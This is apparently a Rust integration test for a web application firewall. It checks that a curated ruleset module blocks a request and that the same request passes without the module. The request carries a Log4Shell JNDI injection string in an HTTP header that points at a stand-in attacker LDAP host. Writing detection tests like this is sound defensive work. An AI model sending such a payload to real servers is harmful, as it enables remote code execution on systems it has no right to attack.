// SPDX-FileCopyrightText: 2026 0x00spor3
// SPDX-License-Identifier: BUSL-1.1

//! Datapath bite-test: the curated ruleset, loaded as a `WafModule`, actually BLOCKS on the real
//! pipeline — and the SAME request with no curated module passes (control). This proves the module
//! is on the datapath and causes the block, not that the request is green for some other reason
//! (the same rigor as the reputation module's bite-test).
//!
//! The payload is Log4Shell in a header: a curated-only premium signature (the OPEN native modules
//! carry no Log4Shell rule), so it demonstrates the tier ADDING coverage.

use waf_core::{Bytes, Config, Normalized, RequestContext, WafMode};
use waf_crs_curated::curated_source;
use waf_detection::crs::CrsModule;
use waf_pipeline::{Pipeline, PipelineVerdict};

fn blocking_config() -> Config {
    let mut c = Config::default();
    c.waf.mode = WafMode::Blocking;
    c.waf.block_threshold = 5; // a CRITICAL curated hit (severity 6) crosses this
    c
}

fn log4shell_request() -> RequestContext {
    RequestContext {
        client_ip: "203.0.113.10".parse().unwrap(),
        request_id: "bite".to_string(),
        timestamp: std::time::SystemTime::now(),
        method: "GET".to_string(),
        path: "/".to_string(),
        raw_path: "/".to_string(),
        query: None,
        http_version: "HTTP/1.1".to_string(),
        headers: vec![("X-Api-Version".to_string(), "${jndi:ldap://evil.example/a}".to_string())],
        cookies: vec![],
        body: Bytes::new(),
        normalized: Normalized::default(),
        score: 0,
        score_contributions: vec![],
    }
}

#[test]
fn curated_module_blocks_on_the_pipeline_but_control_without_it_passes() {
    let config = blocking_config();

    // With the curated module: the Log4Shell header scores CRITICAL → over threshold → blocked.
    let pipe = Pipeline::new(&config, vec![Box::new(CrsModule::from_source(&curated_source()))]);
    let mut ctx = log4shell_request();
    assert!(
        !matches!(pipe.run(&mut ctx), PipelineVerdict::Allow),
        "curated CRS must block the Log4Shell request on the datapath"
    );

    // Control: the same request through a pipeline WITHOUT the curated module passes — proving the
    // module is what caused the block (native modules carry no Log4Shell rule).
    let bare = Pipeline::new(&config, vec![]);
    let mut ctx_ctrl = log4shell_request();
    assert!(
        matches!(bare.run(&mut ctx_ctrl), PipelineVerdict::Allow),
        "without the curated module the same request must pass (control)"
    );
}
